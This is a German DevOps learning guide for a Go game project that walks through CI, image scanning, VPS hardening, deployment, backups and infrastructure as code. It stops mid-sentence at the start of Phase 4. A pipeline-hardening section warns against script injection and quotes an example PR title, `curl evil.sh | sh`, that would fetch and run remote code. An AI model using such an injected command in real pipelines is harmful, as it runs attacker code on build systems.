# Studigame DevOps-Guide

Dein Lernpfad für alles rund um den Spielcode: Pipeline, Container, Server, Deployment,
Infrastruktur als Code, Monitoring, Kubernetes, Security. Den Spielcode schreibt der Agent,
den Betrieb machst du, und zwar selbst.

Stand: 12.11.2026. Ersetzt die alte Fassung dieses Dokuments. Karriere-Kontext steht in
`Karriere-Roadmap_DevOps.md` (außerhalb des Repos).

---

## So benutzt du diesen Guide

Jeder Schritt hat denselben Aufbau:

| Teil | Bedeutung |
|---|---|
| **Ziel** | was am Ende funktioniert |
| **Hintergrund** | die Begriffe, die du brauchst, kurz erklärt. Kein Nachfragen bei der KI nötig |
| **Aufgaben** | was du tust, als Checkliste |
| **Hinweise** | Richtung und Stichworte für die Doku. Bewusst keine fertige Lösung |
| **Fertig, wenn** | ein Test, den du selbst ausführen kannst. Erst wenn er klappt, ist der Schritt fertig |
| **Stolperfallen** | wo man typischerweise hängen bleibt |
| **Doku** | wo du nachliest. Offizielle Doku zuerst |
| **Interview** | eine Frage, die du nach dem Schritt beantworten können solltest |

**Regeln für dich:**
1. Ein Schritt = ein Branch = ein PR. Branch-Namen und PR-Titel wie bisher (`ci/…`,
   `feat(ci): …`), Squash-Merge.
2. **KI nur für Fehlermeldungen erklären lassen**, nie YAML, Code oder Befehle generieren.
   Wenn du festhängst: erst Doku, dann 20 Minuten selbst probieren, dann im Lernlog notieren,
   was unklar ist.
3. Nach jedem Schritt drei Zeilen in `docs/lernlog.md`: was gebaut, was kaputt ging, was gelernt.
   Daraus werden deine Interview-Geschichten.
4. CHANGELOG-Eintrag unter `[Unreleased]` wie im Repo üblich, ROADMAP-Häkchen setzen.
5. Wenn dir für den Betrieb etwas im Spielcode fehlt (Endpunkt, Env-Var, Metrik), schreib ein
   **Issue für den Agent** statt selbst im Spielcode zu arbeiten. Die Issues stehen in
   Abschnitt 8.

**Legende:** ✅ erledigt · 🙋 kostet Geld oder hat Rechtsbezug · 🎯 Portfolio-Meilenstein

---

## Überblick

```
Phase 0  Werkzeuge und Ausgangslage verstehen            ~1 Woche
Phase 1  CI: die Pipeline prüft alles vor dem Merge       ~2–3 Wochen
Phase 2  Image, Server, Deploy, Backup                    ~3–4 Wochen   🎯 Portfolio-Minimum
Phase 3  Infrastruktur als Code (OpenTofu, Ansible)       ~3–4 Wochen
Phase 4  Monitoring und Alerting                          ~2–3 Wochen
Phase 5  Kubernetes und GitOps                            ~4–6 Wochen   (parallel CKA)
Phase 6  DevSecOps und Betrieb vertiefen                  laufend
Neben-   Öffentlich schalten (Recht, Mail, Domain)         wenn du willst, unabhängig vom Lernen
strang
```

Zeiten gelten bei 1–2 h pro Tag. Wichtig ist die Reihenfolge, nicht das Datum.

**Was schon da ist:** Branch-Schutz, Conventions-Check (Branch/PR-Titel), signierte Commits,
`.gitattributes`/`.editorconfig`, CI mit Build, `go vet`, `go test -race`, golangci-lint,
Multi-Stage-`Dockerfile`, `docker-compose.yml` mit Caddy, `scripts/backup.sh` (fehlerhaft, siehe 2.6).

---

## Phase 0: Werkzeuge und Ausgangslage

### 0.1 Lokale Werkzeuge

**Ziel:** Du kannst alles, was die CI macht, auch lokal ausführen.

**Aufgaben**
- [ ] Installiert und im Terminal aufrufbar: `go`, `docker` (Docker Desktop oder Colima),
      `gh` (GitHub CLI), `make`, `jq`, `curl`, `dig`.
- [ ] `make test` und `docker build .` laufen lokal durch.
- [ ] `docs/lernlog.md` angelegt.

**Fertig, wenn:** `docker run --rm -p 8080:8080 <dein-image>` startet und
`curl -i localhost:8080/healthz` liefert `200`.

**Stolperfalle:** Auf dem Mac (Apple Silicon) baut Docker standardmäßig `arm64`-Images, der
Hetzner CX23 ist `amd64`. Für lokale Tests egal, für den Server wichtig (Phase 2).

### 0.2 Das Repo aus Betriebssicht lesen

**Ziel:** Du weißt, wie die App gestartet, konfiguriert und erreicht wird, ohne Spielcode zu lesen.

**Aufgaben**
- [ ] `internal/config/config.go` lesen: welche Env-Vars gibt es, welche Defaults?
      Vergleiche mit `.env.example`. Stimmt der Default-Port überein?
- [ ] `cmd/server/main.go` überfliegen: wo werden Routen registriert, wo Timeouts gesetzt,
      wie reagiert der Server auf SIGTERM?
- [ ] `Dockerfile` Zeile für Zeile erklären können (in eigenen Worten ins Lernlog).
- [ ] `docker-compose.yml` und `deploy/Caddyfile`: wer redet mit wem auf welchem Port?

**Hintergrund**
- **12-Factor-Config:** Konfiguration kommt aus Umgebungsvariablen, nicht aus Dateien im
  Image. Dasselbe Image läuft so lokal, auf dem VPS und in Kubernetes.
- **Reverse Proxy:** Caddy nimmt HTTPS auf Port 443 an, holt sich automatisch ein
  Let's-Encrypt-Zertifikat und reicht Anfragen an die App auf Port 8080 im internen
  Docker-Netz weiter. Die App selbst spricht nur HTTP.
- **`expose` vs. `ports`:** `expose` macht einen Port nur im Docker-Netz sichtbar, `ports`
  veröffentlicht ihn auf dem Host. Die App darf nie direkt erreichbar sein, weil sie dem
  Header `X-Forwarded-For` vertraut (Rate-Limit). Wer direkt an Port 8080 kommt, könnte
  ihn fälschen.

**Fertig, wenn:** Du kannst ein Diagramm zeichnen (Papier reicht): Browser → DNS → Caddy :443 →
App :8080 → SQLite-Datei im Volume. Foto davon ins Lernlog.

**Interview:** „Warum sollte Konfiguration nicht ins Image gebacken werden?“

---

## Phase 1: CI – die Pipeline prüft alles vor dem Merge

**Hintergrund für die ganze Phase**
- **CI (Continuous Integration):** Jede Änderung wird automatisch gebaut und geprüft, bevor
  sie nach `main` darf. **CD** (Continuous Delivery/Deployment) bringt sie danach automatisch
  in eine Umgebung.
- **GitHub Actions:** Ein *Workflow* (`.github/workflows/*.yml`) wird durch ein *Event*
  ausgelöst (`push`, `pull_request`, `schedule`, Tag). Er enthält *Jobs*, die parallel auf
  frischen VMs (*Runnern*) laufen. Jeder Job hat *Steps*: entweder ein Shell-Befehl (`run:`)
  oder eine fertige *Action* (`uses:`).
- **Fail fast:** Billige Prüfungen zuerst (Formatierung, vet), teure danach (Tests, Image-Scan).
  Feedback im PR sollte unter 5 Minuten kommen.
- **Required Check:** Im Branch-Schutz eingetragene Jobs müssen grün sein, sonst kein Merge.
  Wenn du Jobs umbenennst, musst du den Branch-Schutz anpassen.

### ✅ 1.0 Bereits erledigt
Branch-Schutz, Conventions-Check, setup-go mit Cache, golangci-lint.

### 1.1 Bestehende Workflows aufräumen

**Ziel:** Die zwei Workflows sind konsistent und du verstehst jede Zeile.

**Aufgaben**
- [ ] In `go.yml` nutzt der Build-Job `actions/checkout@v4` und `setup-go@v5`, der Lint-Job
      `@v6`. Vereinheitliche auf die aktuelle Version.
- [ ] `go test -race -v` erzeugt sehr viel Ausgabe. Überleg, ob `-v` nötig ist.
- [ ] Prüfe in den Logs eines Runs: Wie lange dauert jeder Step? Wo wird der Cache getroffen
      („cache hit“)?

**Fertig, wenn:** Ein PR mit nur einer Kommentaränderung ist in unter 3 Minuten grün.

**Doku:** docs.github.com → Actions → „Workflow syntax for GitHub Actions“.

### 1.2 Makefile als einzige Tür

**Ziel:** Lokal und in der CI laufen exakt dieselben Prüfungen über `make ci`.

**Hintergrund:** Wenn die CI andere Befehle ausführt als du lokal, entsteht *Drift*: lokal
grün, in der CI rot (oder umgekehrt). Ein gemeinsamer Einstiegspunkt verhindert das.

**Aufgaben**
- [ ] Ziel `fmt-check`: schlägt fehl, wenn `gofmt -l .` Dateien ausgibt.
- [ ] Ziel `lint`: ruft golangci-lint auf.
- [ ] Ziel `vuln`: ruft `govulncheck ./...` auf (siehe 1.3).
- [ ] Ziel `ci`: hängt fmt-check, vet, lint, test, vuln hintereinander.
- [ ] Ziel `help`: listet alle Ziele mit einer Zeile Beschreibung.
- [ ] Die CI ruft danach `make …` statt einzelner Befehle.

**Hinweise**
- `gofmt -l` gibt nur Dateinamen aus und endet trotzdem mit Exit-Code 0. Du musst selbst
  dafür sorgen, dass „Ausgabe nicht leer“ zum Fehler wird. Stichwort: `test -z "$(…)"`.
- Werkzeug-Versionen festnageln: Go kann Tools im `go.mod` verwalten (`go get -tool …`,
  danach `go tool <name>`). Dann braucht weder du noch die CI eine separate Installation.
- Ein verbreitetes Muster für `make help` liest Kommentare hinter den Zielen per `grep`/`awk`
  aus. Such nach „self-documenting Makefile“.

**Fertig, wenn:** Du baust absichtlich einen Formatierungsfehler ein (Leerzeichen statt Tab),
`make ci` schlägt lokal fehl und die CI im PR ebenfalls, mit verständlicher Meldung.

**Stolperfalle:** Make-Rezepte müssen mit einem echten Tab eingerückt sein. Die
`.editorconfig` sollte für `Makefile` Tabs erzwingen.

### 1.3 Abhängigkeiten und Secrets prüfen

**Ziel:** Bekannte Schwachstellen in Go-Abhängigkeiten und versehentlich committete Secrets
brechen den PR.

**Hintergrund**
- **govulncheck** (vom Go-Team) prüft deine Abhängigkeiten gegen die Go-Schwachstellen-
  Datenbank. Besonderheit: Er meldet nur Schwachstellen in Funktionen, die dein Code wirklich
  aufruft (*reachability*). Weniger Fehlalarme als reine Versionslisten.
- **gitleaks** durchsucht Dateien und Git-Historie nach Mustern wie API-Keys, Tokens,
  privaten Schlüsseln.

**Aufgaben**
- [ ] `govulncheck` als eigener CI-Job oder Teil von `make ci`.
- [ ] `gitleaks` als eigener Job, der die gesamte Historie prüft.
- [ ] GitHub-Einstellungen: *Secret scanning* und *Push protection* aktivieren
      (Settings → Code security).

**Hinweise**
- Für die Historie braucht der Checkout mehr als den letzten Commit. Schau dir den
  Parameter `fetch-depth` von `actions/checkout` an.
- Teste gitleaks lokal, bevor du ihn in die CI hängst.

**Fertig, wenn:** Ein Test-Branch mit einer Datei, die einen Fake-Key im AWS-Format enthält,
wird rot. Danach Branch löschen (nicht mergen).

**Interview:** „Ein Secret wurde versehentlich gepusht. Was tust du?“ (Antwort beginnt
mit „rotieren“, nicht mit „Commit löschen“.)

### 1.4 Pipeline härten

**Ziel:** Die Pipeline selbst ist kein Einfallstor.

**Hintergrund**
- Der `GITHUB_TOKEN` jedes Workflows hat Rechte im Repo. Ohne Angabe sind es je nach
  Repo-Einstellung zu viele. **Least Privilege:** global nur `contents: read`, pro Job mehr
  nur dort, wo nötig.
- Third-Party-Actions werden per Tag referenziert (`@v4`). Ein Tag kann umgehängt werden.
  Ein **Commit-SHA** ist unveränderlich. Dependabot kann SHA-gepinnte Actions trotzdem
  aktualisieren.
- **concurrency:** Pushst du zweimal schnell hintereinander, laufen zwei Pipelines. Eine
  Concurrency-Gruppe bricht die ältere ab und spart Zeit.

**Aufgaben**
- [ ] `permissions:` auf Workflow-Ebene setzen, in beiden Workflows.
- [ ] `concurrency` mit `cancel-in-progress` für PR-Läufe.
- [ ] Alle `uses:` von Drittanbietern (alles außer `actions/*` ist Pflicht, `actions/*` ist
      Kür) auf Commit-SHA pinnen, Version als Kommentar dahinter.
- [ ] `.github/dependabot.yml` für `gomod`, `docker` und `github-actions`, wöchentlich,
      Minor/Patch gruppiert.

**Stolperfalle:** In `ci.yml` wird der PR-Titel richtig über `env:` an das Skript gegeben.
Schreib `${{ github.event.pull_request.title }}` nie direkt in eine `run:`-Zeile: ein Titel
wie `"; curl evil.sh | sh; #` würde ausgeführt (Script Injection).

**Fertig, wenn:** Dependabot öffnet seinen ersten PR, und der läuft grün durch.

**Doku:** GitHub Docs → „Security hardening for GitHub Actions“.

### 1.5 Image im PR bauen und scannen

**Ziel:** Jeder PR beweist, dass das Image baut, und Trivy meldet kritische Lücken.

**Hintergrund**
- **Trivy** scannt Container-Images (Betriebssystem-Pakete und Go-Binaries), aber auch
  Dockerfiles und Kubernetes-Manifeste auf Fehlkonfigurationen.
- Severity-Stufen: CRITICAL, HIGH, MEDIUM, LOW. Üblich: CI bricht bei CRITICAL/HIGH mit
  verfügbarem Fix (`ignore-unfixed`).
- Im PR wird gebaut, aber **nicht** gepusht. Gepusht wird nur von `main` (Phase 2).

**Aufgaben**
- [ ] `.dockerignore` anlegen (fehlt bisher). Überleg, was nicht in den Build-Kontext gehört:
      `.git`, lokale DB, `.env`, `tailwindcss`-Binary, `bin/`, IDE-Ordner.
- [ ] Job „image“: baut mit Buildx, ohne Push, lädt das Image lokal in den Runner, scannt es
      mit Trivy.
- [ ] Zusätzlich `trivy config` auf `Dockerfile` und `docker-compose.yml`.
- [ ] Build-Cache für Docker-Layer über GitHub Actions nutzen.

**Hinweise**
- `docker/build-push-action` hat Parameter für „nicht pushen, aber lokal laden“.
  Ohne lokales Image kann Trivy nichts scannen.
- Cache-Stichwort in der Doku der Action: `cache-from`/`cache-to` mit `type=gha`.
- Prüf die Image-Größe vorher und nachher. Ein Go-Binary mit Alpine sollte deutlich unter
  50 MB liegen.

**Fertig, wenn:** Du änderst testweise `FROM alpine:3.20` auf eine alte Version (z. B. 3.14),
Trivy wird rot. Danach zurück.

**Stolperfalle:** Findet Trivy etwas ohne Fix, nicht reflexartig ignorieren. Jede Ausnahme
kommt mit Begründung und Ablaufdatum in `.trivyignore`.

**Interview:** „Wie stellst du sicher, dass keine bekannten Schwachstellen in Produktion gehen?“

---

## Phase 2: Image, Server, Deploy, Backup 🎯

Am Ende dieser Phase läuft Studigame per HTTPS auf deinem eigenen Server, ein Tag-Push
deployt automatisch, und du hast ein getestetes Backup. Das ist das Minimum, mit dem du
dich glaubwürdig auf DevOps-Stellen bewirbst.

### 2.1 Image nach GHCR pushen

**Ziel:** Jeder Merge nach `main` erzeugt ein Image in der GitHub Container Registry.

**Hintergrund**
- **Registry:** Speicher für Images (Docker Hub, GHCR, ECR, Harbor). GHCR gehört zu deinem
  GitHub-Account, Login über den `GITHUB_TOKEN` des Workflows.
- **Tag vs. Digest:** Ein Tag (`main`, `v0.3.0`) ist ein beweglicher Name. Der Digest
  (`sha256:…`) ist der unveränderliche Fingerabdruck des Inhalts.
- **Build once, deploy many:** Das Image wird einmal gebaut und genau dieses Image (gleicher
  Digest) geht auf alle Umgebungen. Nie auf dem Server neu bauen. Nie `latest` in Produktion.
- **Multi-Arch:** Ein Image-Tag kann Varianten für `amd64` und `arm64` enthalten. Für den
  CX23 reicht `amd64`. Multi-Arch ist Kür.

**Aufgaben**
- [ ] Workflow (oder Job) für `push` auf `main`: Login bei GHCR, Tags erzeugen, bauen, pushen.
- [ ] Tags: `sha-<kurzer-commit>` und `main`. Bei Git-Tags `v*` zusätzlich die Version.
- [ ] Rechte: nur dieser Job bekommt `packages: write`.
- [ ] Issue für den Agent: Versionsinfo ins Binary (Abschnitt 8).

**Hinweise**
- `docker/metadata-action` erzeugt Tags und Labels aus Git-Infos. Lies dort die Beispiele zu
  `type=sha` und `type=semver`.
- Paket-Sichtbarkeit in GHCR prüfen (privat/öffentlich). Für den Server brauchst du sonst
  einen Login.

**Fertig, wenn:** Auf GitHub unter „Packages“ liegt ein Image mit Tag `sha-…`, und
`docker pull ghcr.io/<user>/studigame:main` funktioniert auf deinem Mac.

### 2.2 🙋 VPS bestellen und Linux-Grundlagen

**Ziel:** Ein gehärteter Ubuntu-Server, auf den nur du per SSH-Key kommst.

**Hintergrund**
- **SSH-Key:** Privater Schlüssel bleibt auf deinem Mac, der öffentliche liegt auf dem Server
  in `~/.ssh/authorized_keys`. Passwort-Login wird abgeschaltet.
- **sudo-User:** Du arbeitest nicht als `root`, sondern als normaler User mit `sudo`.
  Root-Login per SSH wird verboten.
- **Firewall:** `ufw` auf dem Server oder die **Hetzner Cloud Firewall** davor. Offen sind nur
  22 (SSH), 80 und 443.
- **fail2ban** sperrt IPs nach fehlgeschlagenen Logins. **unattended-upgrades** spielt
  Sicherheitsupdates automatisch ein.
- **systemd:** startet und überwacht Dienste. `systemctl status`, `journalctl -u <dienst>`
  sind deine wichtigsten Debug-Befehle.

**Aufgaben**
- [ ] Hetzner CX23, Ubuntu 26.04 LTS, SSH-Key beim Anlegen hinterlegen. Ca. 4–5 € pro Monat.
- [ ] Neuen User anlegen, in Gruppe `sudo`, Key hinterlegen.
- [ ] `sshd`: Root-Login und Passwort-Login aus. **Vorher** in einer zweiten Session prüfen,
      dass der neue User reinkommt.
- [ ] Firewall: Hetzner Cloud Firewall (22/80/443) **und** verstehen, warum `ufw` allein bei
      Docker nicht reicht (Stolperfalle unten).
- [ ] `fail2ban` und `unattended-upgrades` installieren und Status prüfen.
- [ ] Docker Engine und Compose-Plugin aus dem offiziellen Docker-Repo installieren
      (nicht das Ubuntu-Paket `docker.io`). User in Gruppe `docker`.
- [ ] Alles, was du tust, als Befehlsliste in `docs/runbooks/server-setup.md` mitschreiben.
      Die wird in Phase 3 zum Ansible-Playbook.

**Hinweise**
- Die SSH-Konfiguration liegt unter `/etc/ssh/sshd_config` und `/etc/ssh/sshd_config.d/`.
  Nach Änderungen Syntax prüfen (`sshd -t`), dann Dienst neu laden.
- `~/.ssh/config` auf dem Mac mit einem Host-Alias spart Tipparbeit.

**Fertig, wenn**
- `ssh root@<ip>` wird abgelehnt, `ssh <user>@<ip>` mit Key klappt, Passwort wird nie gefragt.
- `nmap -Pn <ip>` von deinem Mac zeigt nur 22, 80, 443.
- `sudo fail2ban-client status sshd` zeigt den aktiven Jail.

**Stolperfallen**
- **Docker umgeht `ufw`:** Mit `ports:` veröffentlichte Container-Ports schreibt Docker direkt
  in iptables, an `ufw` vorbei. Ein Port, den `ufw` blockiert, kann trotzdem offen sein.
  Deshalb Cloud-Firewall vor dem Server und `expose` statt `ports` für alles außer Caddy.
- Aussperren: Ändere SSH nie, ohne eine zweite offene Session. Notfalls hilft die
  Hetzner-Web-Konsole.

**Doku:** Ubuntu Server Guide (ubuntu.com/server/docs), Docker „Install Docker Engine on
Ubuntu“, Docker „Packet filtering and firewalls“.

**Interview:** „Wie härtest du einen frischen Linux-Server?“

### 2.3 🙋 Domain und DNS

**Ziel:** Eine Test-Subdomain zeigt auf deinen Server.

**Hintergrund**
- **A-Record** verbindet Name → IPv4, **AAAA** Name → IPv6. **TTL** ist die Cache-Dauer.
- Let's Encrypt prüft per HTTP-Challenge auf Port 80, ob dir die Domain gehört. Deshalb
  muss Port 80 offen sein, obwohl die Seite später nur HTTPS spricht.

**Aufgaben**
- [ ] Domain registrieren (ca. 10 € pro Jahr), z. B. bei INWX oder direkt Hetzner DNS.
- [ ] A- (und AAAA-)Record für `test.<deinedomain>` setzen, kurze TTL (300).

**Fertig, wenn:** `dig +short test.<deinedomain>` liefert die Server-IP.

**Stolperfalle:** Mit Proxy-Diensten wie Cloudflare (orange Wolke) sieht die Welt eine
andere IP und die Zertifikats-Challenge verhält sich anders. Für den Anfang ohne Proxy.

### 2.4 Erstes Deployment per Hand

**Ziel:** Die App läuft per HTTPS auf der Test-Subdomain, mit dem Image aus GHCR.

**Hintergrund**
- Aktuell steht in `docker-compose.yml` `build: .` – der Server würde selbst bauen. Das
  widerspricht „build once“. Für den Server soll Compose ein fertiges Image ziehen.
- **Named Volume:** Docker verwaltet den Speicherort, die Daten überleben Neustarts und
  Container-Austausch.

**Aufgaben**
- [ ] Compose so umbauen, dass lokal weiter gebaut werden kann, auf dem Server aber das
      GHCR-Image genutzt wird.
- [ ] Auf dem Server: Verzeichnis anlegen, `docker-compose.yml`, `deploy/Caddyfile` und `.env`
      dorthin. `.env` mit `APP_ENV=production` und `SITE_DOMAIN=test.<deinedomain>`.
      `.env` hat Dateirechte `600`.
- [ ] `docker compose pull` und `up -d`, Logs beider Container lesen.

**Hinweise**
- Zwei Wege für „lokal bauen, Server ziehen“: zwei Compose-Dateien (Basis + Override) oder
  eine Variable für das Image mit Default. Lies in der Compose-Doku „Merge and override“
  bzw. „Interpolation“.
- Das Image-Tag gehört in die `.env` oder als Variable in den Deploy-Befehl, nicht hart in
  die Compose-Datei. Dann ist ein Rollback nur ein anderes Tag.

**Fertig, wenn**
- `curl -I https://test.<deinedomain>/healthz` liefert `200` und ein gültiges Zertifikat.
- `curl http://<server-ip>:8080` aus dem Internet läuft ins Leere.
- Nach `docker compose down && docker compose up -d` ist ein angelegter Testaccount noch da.

**Stolperfallen**
- Caddy findet kein Zertifikat: meist DNS noch nicht propagiert oder Port 80 zu.
  `docker compose logs caddy` lesen.
- App startet, aber Seite leer: `static/` fehlt im Image oder falscher Arbeitsordner.

**Interview:** „Erklär den Weg einer Anfrage von Browser bis Datenbank in deinem Setup.“

### 2.5 Automatisches Deployment (CD)

**Ziel:** Ein Git-Tag `v*` deployt nach deiner Freigabe automatisch auf den Server.

**Hintergrund**
- **Push-Deploy:** Die CI meldet sich per SSH am Server an und führt das Update aus. Einfach,
  aber die CI braucht einen Server-Schlüssel. (Das Gegenstück **Pull/GitOps** kommt in Phase 5.)
- **GitHub Environments:** z. B. `production` mit eigenen Secrets und *Required reviewers*.
  Der Job wartet, bis du ihn freigibst.
- **SemVer:** `MAJOR.MINOR.PATCH`. Vor dem Launch `v0.x.y`.

**Aufgaben**
- [ ] Eigener SSH-Key nur für Deploys (ohne Passphrase), öffentlicher Teil auf dem Server.
      Überleg, wie du die Rechte dieses Keys einschränken kannst.
- [ ] Environment `production` mit Secrets (Host, User, Key, `known_hosts`-Eintrag) und dir
      als Reviewer.
- [ ] Workflow auf `push` von Tags `v*`: wartet auf Freigabe, verbindet sich per SSH, setzt das
      neue Image-Tag, `pull`, `up -d`, danach Smoke-Test auf `/healthz`.
- [ ] Rollback üben: altes Tag erneut deployen.
- [ ] `docs/runbooks/rollback.md` schreiben.

**Hinweise**
- `known_hosts` vorher eintragen, statt Host-Key-Prüfung abzuschalten. Den Eintrag bekommst
  du mit `ssh-keyscan`.
- Smoke-Test: Die Pipeline soll rot werden, wenn `/healthz` nach dem Deploy nicht antwortet.
  Mit `curl` gibt es eine Option, die bei HTTP-Fehlern einen Fehlercode liefert, und eine für
  Wiederholungen.

**Fertig, wenn:** `git tag v0.1.0 && git push --tags` → Freigabe klicken → neue Version läuft,
erkennbar an der Versionsinfo (Issue 8.1).

**Interview:** „Wie rollst du ein fehlerhaftes Release zurück?“ und „Warum ist ein
Schema-Rollback schwerer als ein Image-Rollback?“

### 2.6 Backup und Restore

**Ziel:** Nächtliches, konsistentes Backup der SQLite-Datenbank, und du hast einen Restore
wirklich ausgeführt.

**Hintergrund**
- Die App nutzt SQLite im **WAL-Modus**: Änderungen landen erst in `studigame.db-wal` und
  werden später in die Hauptdatei geschrieben. Ein einfaches `cp` der `.db`-Datei im laufenden
  Betrieb kann eine inkonsistente Kopie erzeugen. Genau das macht `scripts/backup.sh` heute.
- Konsistente Wege: der SQLite-Befehl `.backup` oder `VACUUM INTO 'datei'`.
- **RPO** (Recovery Point Objective): wie viele Daten darfst du maximal verlieren (z. B. 24 h).
  **RTO** (Recovery Time Objective): wie lange darf die Wiederherstellung dauern (z. B. 30 min).
- **3-2-1-Regel:** 3 Kopien, 2 Medien, 1 außer Haus. Ein Backup auf demselben Server ist kein
  Backup.
- Ein Backup gilt erst als Backup, wenn ein Restore getestet ist.

**Aufgaben**
- [ ] `scripts/backup.sh` auf eine konsistente Methode umbauen.
- [ ] Backup außer Haus kopieren (Hetzner Storage Box oder Object Storage) 🙋.
- [ ] Nächtlich per `systemd`-Timer oder Cron.
- [ ] Restore auf einem frischen Container testen, Zeit stoppen.
- [ ] `docs/runbooks/restore-db.md` mit Datum „zuletzt getestet“.

**Hinweise**
- Das App-Image enthält kein `sqlite3`-Programm. Überleg: Läuft das Backup auf dem Host gegen
  die Volume-Datei, in einem kurzlebigen Hilfscontainer mit demselben Volume, oder ergänzt
  du das Image? Jede Variante hat Vor- und Nachteile, schreib deine Entscheidung ins Lernlog.
- `docker volume inspect` zeigt, wo das Volume auf dem Host liegt.
- Prüfe das Backup nach dem Erstellen: `PRAGMA integrity_check` muss `ok` liefern.

**Fertig, wenn:** Du löschst auf dem Server das Volume (nach Backup!), stellst aus dem Backup
wieder her, und dein Testaccount ist zurück. RTO steht im Runbook.

**Interview:** „Wie sicherst du eine Datenbank, und woher weißt du, dass das Backup funktioniert?“

### 🎯 Checkpoint Phase 2

Lebenslauf-Zeile, ab jetzt ehrlich verwendbar:
> Studigame (Go, SQLite): CI/CD mit GitHub Actions (Lint, Tests, govulncheck, gitleaks,
> Trivy), Images in GHCR, Betrieb auf gehärtetem Hetzner-VPS mit Docker Compose und Caddy
> (Auto-TLS), Tag-basiertes Deployment mit Freigabe, getestete Backups.

---

## Phase 3: Infrastruktur als Code

**Hintergrund für die ganze Phase**
- **IaC (Infrastructure as Code):** Server, Firewalls, DNS-Einträge werden in Dateien
  beschrieben und per Werkzeug angelegt. Vorteil: nachvollziehbar (Git), wiederholbar,
  reviewbar.
- **Terraform/OpenTofu** beschreibt *was* existieren soll (deklarativ) und legt es über die
  API des Anbieters an. OpenTofu ist der quelloffene Fork von Terraform, Syntax gleich.
  In Anzeigen steht meist „Terraform“, beides zählt.
- **Ansible** konfiguriert, *was auf* dem Server passiert (Pakete, Dateien, Dienste).
  Agentenlos per SSH. Kernidee **Idempotenz:** zweimal ausführen ändert beim zweiten Mal nichts.
- Arbeitsteilung: OpenTofu erzeugt den Server, Ansible richtet ihn ein.

### 3.1 OpenTofu-Grundlagen

**Ziel:** Du verstehst Provider, Ressourcen, State und den Ablauf `init → plan → apply → destroy`.

**Hintergrund**
- **Provider:** Plugin für eine API (hier `hetznercloud/hcloud`).
- **Ressource:** etwas, das existieren soll (`hcloud_server`, `hcloud_firewall`).
- **State:** Datei, in der OpenTofu speichert, welche echte Ressource zu welcher Zeile Code
  gehört. Geht der State verloren, „vergisst“ OpenTofu deine Infrastruktur.
- **Plan:** Vorschau der Änderungen. Immer lesen, bevor du `apply` bestätigst.
- **Variablen/Outputs:** Eingaben (z. B. Servertyp) und Ausgaben (z. B. IP).

**Aufgaben**
- [ ] Offizielles OpenTofu- oder HashiCorp-„Get Started“-Tutorial durcharbeiten (lokaler
      Docker-Provider reicht, kostet nichts).
- [ ] Danach in `infra/` ein **zweites, separates** Hetzner-Projekt: ein kleiner Server,
      SSH-Key, Firewall. Nicht den Produktionsserver.
- [ ] Hetzner-API-Token als Umgebungsvariable, nie in Dateien.
- [ ] `apply`, per SSH einloggen, `destroy`.

**Fertig, wenn:** `tofu plan` nach einem `apply` meldet „No changes“. Und nach `destroy`
ist in der Hetzner-Konsole nichts mehr übrig.

**Stolperfalle:** `*.tfstate` enthält Secrets und gehört nie in Git. `.gitignore` vor dem
ersten `apply` anpassen.

**Doku:** opentofu.org/docs, Registry-Doku des `hcloud`-Providers.

### 3.2 Remote State und CI

**Ziel:** Der State liegt nicht auf deinem Mac, und PRs zeigen den Plan.

**Hintergrund**
- **Remote State** in einem S3-kompatiblen Bucket (Hetzner Object Storage) mit **Locking**,
  damit nie zwei Läufe gleichzeitig ändern.
- Im PR: `fmt -check`, `validate`, `plan`. Erst nach Merge und Freigabe: `apply`.

**Aufgaben**
- [ ] Bucket anlegen 🙋, Backend konfigurieren, State migrieren.
- [ ] Workflow `infra.yml`: läuft nur bei Änderungen unter `infra/`, macht im PR fmt/validate/
      plan, nach Merge `apply` mit Environment-Freigabe.
- [ ] `tflint` und `trivy config infra/` dazu.

**Hinweise:** In der Backend-Doku nach „s3“ und Hinweisen zu S3-kompatiblen Anbietern suchen.
Für Workflows nur bei bestimmten Pfaden: `on.pull_request.paths`.

**Fertig, wenn:** Ein PR, der den Servertyp ändert, zeigt den Plan im Job-Log, und erst nach
Merge und Freigabe wird geändert.

### 3.3 Produktionsserver unter IaC

**Ziel:** Der echte Server, die Firewall und der DNS-Eintrag sind in OpenTofu beschrieben.

**Aufgaben**
- [ ] Bestehende Ressourcen importieren (statt neu anzulegen) oder bewusst neu bauen und
      umziehen. Entscheidung ins Lernlog.
- [ ] DNS-Record als Ressource, falls dein DNS-Anbieter einen Provider hat.

**Hinweis:** Stichwort `import`-Block in der Doku.

**Fertig, wenn:** `tofu plan` gegen Produktion zeigt „No changes“.

### 3.4 Ansible: Server-Setup als Playbook

**Ziel:** Dein Runbook `server-setup.md` aus 2.2 ist ein Ansible-Playbook.

**Hintergrund**
- **Inventory:** Liste der Server. **Playbook:** Liste von Aufgaben. **Modul:** fertiger
  Baustein (`apt`, `user`, `copy`, `template`, `systemd`). **Role:** wiederverwendbares
  Paket von Aufgaben. **Handler:** wird nur ausgeführt, wenn sich etwas geändert hat
  (z. B. SSH neu laden).
- **Check-Modus** (`--check --diff`) zeigt, was sich ändern würde.

**Aufgaben**
- [ ] `infra/ansible/` mit Inventory und Playbook: User, SSH-Härtung, fail2ban,
      unattended-upgrades, Docker, App-Verzeichnis, Compose-Dateien, systemd-Timer fürs Backup.
- [ ] Secrets (Inhalt der `.env`) mit **Ansible Vault** verschlüsseln.
- [ ] `ansible-lint` in die CI.

**Hinweise**
- Für jede Zeile deines Runbooks gibt es fast immer ein Modul. `shell`/`command` nur, wenn
  wirklich keins passt, denn die sind nicht automatisch idempotent.
- Docker hat eine eigene Ansible-Collection (`community.docker`).

**Fertig, wenn:** Das Playbook läuft zweimal hintereinander, beim zweiten Lauf steht überall
`ok`, nirgends `changed`.

### 3.5 🎯 Alles neu aus Code

**Ziel:** Du kannst die komplette Produktion aus Git und Backup neu aufbauen.

**Aufgaben**
- [ ] Auf einem Wochenende: Backup ziehen, neuen Server per OpenTofu, Ansible drüber,
      Backup zurückspielen, DNS umstellen, alten Server zerstören.
- [ ] Zeit messen, Probleme notieren, `docs/runbooks/rebuild.md` schreiben.

**Fertig, wenn:** Studigame läuft auf dem neuen Server mit allen Daten, und du hast nichts
von Hand auf dem Server getippt.

**Interview:** „Euer Server ist weg. Wie lange braucht ihr, bis alles wieder läuft?“ Du hast
eine gemessene Zahl.

---

## Phase 4: Monitoring und Alerting

**Hintergrund für die ganze Phase**
- **Logs:** Ereignisse als Text (bei uns JSON über `slog`). **Metriken:** Zahlen über die Zeit
